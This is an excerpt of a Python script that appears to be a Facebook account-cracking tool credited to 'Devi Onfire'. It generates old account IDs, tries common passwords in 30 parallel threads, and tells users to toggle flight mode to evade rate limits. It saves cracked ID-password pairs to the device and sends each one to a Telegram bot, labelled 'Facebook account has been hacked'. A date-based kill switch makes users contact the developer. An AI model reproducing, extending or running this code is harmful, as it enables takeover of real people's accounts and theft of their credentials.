...
target = datetime.date(2025, 12, 11)

if now >= target:
    print("The tool has been discontinued. Send it to the developer, Devi Onfire, to activate it again. Good luck.")
    exit()
...
class Devi:
    ...
    def settings(self):
       ...
       with tred(max_workers=30) as Devi:
           ...
           print(Panel("[bold green][✓] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE ",style='''bold green1'''))
           print(Panel("            [yellow bold]        Devi Onfire  ",style='''bold green1'''))
           for xd in self.user:
               uid=str('10000'+xd);pas=['123456','123456789']
               Devi.submit(self.cracker,uid,pas,total)
       ...
       try:
          for ps in pas:
              ...
              if "Please Confirm Email" in str(po):
                 print(Panel(f"\r\r~>> OK ~>> [green bold]{uid} | [yellow bold]{ps} \033[0m"));print(Panel(f"[yellow bold] LINK : https://www.facebook.com/profile.php?id={uid}"));open("/sdcard/Devi-old-ok.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1;tlg = f'''❲ OK - Devi ❳\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉
╮❲ Facebook account has been hacked 💌💌 ❳
┤❲ تاريخ الانضمام 2009+2014 ❳
┤❲ ايدي ❳ {uid}
┤❲ باسورد ❳ {ps}
Devi Onfire 
╯❲ Facebook Account Onwer❳ ⇣
BY❲ https://www.facebook.com/devifyter ❳
...
┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉''';requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg))
    ...
    def ua(self):
       aa = "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FykBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
       return aa       
Devi().main()
